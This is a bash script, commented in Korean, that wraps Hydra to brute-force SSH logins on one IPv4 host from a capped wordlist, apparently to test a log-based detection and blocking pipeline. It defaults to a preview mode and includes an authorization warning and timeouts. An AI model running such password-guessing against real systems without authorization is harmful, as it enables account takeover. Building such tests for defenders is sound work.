#!/usr/bin/env bash
# Why: 승인된 단일 EC2에 인증 실패 로그를 생성하여 탐지·차단 파이프라인을 검증한다.
# Constraints: IPv4 한 개, 포트 1~65535, 사용자 한 명, 비밀번호 최대 100개.
# Side-effects: --execute는 실제 SSH 트래픽과 인증 로그를 발생시킨다.
# 계정 잠금이 발생할 수 있으므로 승인된 테스트 계정만 사용한다.
set -euo pipefail

usage() {
    echo "사용법: $0 <타깃_IPv4> [포트=22] [목록=wordlist.txt] [사용자=admin] [--execute]"
    echo "기본값은 미리보기. --execute는 해당 서버에 대한 테스트 승인을 확인한 뒤 지정한다."
}
fail() { echo "[오류] $*" >&2; exit 1; }
if [[ ${1:-} == --help ]]; then usage; exit 0; fi
if (( $# < 1 || $# > 5 )); then usage >&2; exit 1; fi
target=$1
port=${2:-22}
wordlist=${3:-wordlist.txt}
username=${4:-admin}
mode=${5:-}
[[ -z $mode || $mode == --execute ]] || fail "마지막 인자는 --execute만 허용합니다."
[[ $target =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || fail "IPv4 주소가 필요합니다."
IFS=. read -r -a octets <<< "$target"
for octet in "${octets[@]}"; do
    (( 10#$octet <= 255 )) || fail "IPv4 옥텟은 0~255여야 합니다."
    [[ $octet == 0 || $octet != 0* ]] || fail "IPv4의 선행 0은 허용하지 않습니다."
done
[[ $port =~ ^[0-9]{1,5}$ ]] || fail "포트는 정수여야 합니다."
port=$((10#$port))
(( port >= 1 && port <= 65535 )) || fail "포트 범위는 1~65535입니다."
[[ $username =~ ^[a-zA-Z_][a-zA-Z0-9_.-]{0,31}$ ]] || fail "테스트 사용자 이름 형식이 잘못되었습니다."
[[ -f $wordlist && -r $wordlist ]] || fail "읽을 수 있는 비밀번호 목록 파일이 필요합니다."

# 검증한 목록을 별도 작업 디렉토리에 고정하여 실행 간 복구 파일 충돌을 방지한다.
# 비밀번호는 출력하지 않으며 임시 파일 권한은 소유자에게만 부여한다.
umask 077
workdir=$(mktemp -d)
trap 'rm -rf -- "$workdir"' EXIT
trap 'exit 130' INT
trap 'exit 143' TERM
count=0
while IFS= read -r password || [[ -n $password ]]; do
    password=${password%$'\r'}
    [[ -n $password ]] || fail "빈 비밀번호는 허용하지 않습니다."
    (( ${#password} <= 128 )) || fail "비밀번호는 128자 이하여야 합니다."
    count=$((count + 1))
    (( count <= 100 )) || fail "목록은 최대 100개까지 허용합니다."
    printf '%s\n' "$password" >> "$workdir/passwords.txt"
done < "$wordlist"
(( count > 0 )) || fail "목록이 비어 있습니다."
command=(hydra -l "$username" -P "$workdir/passwords.txt" -s "$port" -t 4 -f "$target" ssh)
printf '대상: %s:%s / 사용자: %s / 후보: %s개 / 동시 연결: 4 / 제한: 60초\n' "$target" "$port" "$username" "$count"
printf '패킷 캡처(별도 터미널): sudo tcpdump -i any host %s and port %s -w /tmp/ssh_attack.pcap -c 1000\n' "$target" "$port"
if [[ -z $mode ]]; then
    echo "[미리보기] 네트워크 요청 없음. 실행하려면 마지막 인자에 --execute를 지정하세요."
    exit 0
fi
command -v hydra >/dev/null 2>&1 || fail "Hydra를 설치하세요(SSH 모듈 필요)."
command -v timeout >/dev/null 2>&1 || fail "GNU coreutils timeout을 설치하세요."
# -f는 인증 성공 시 중단한다. 타임아웃은 124, 기타 오류는 원래 종료 코드로 전달한다.
# Hydra 출력에는 성공한 인증 정보가 포함될 수 있으므로 테스트용 목록만 사용한다.
cd -- "$workdir"
status=0
timeout --kill-after=5s 60s "${command[@]}" || status=$?
if (( status != 0 )); then
    echo "[종료] Hydra/timeout 종료 코드: $status (124: 시간 제한)" >&2
fi
exit "$status"
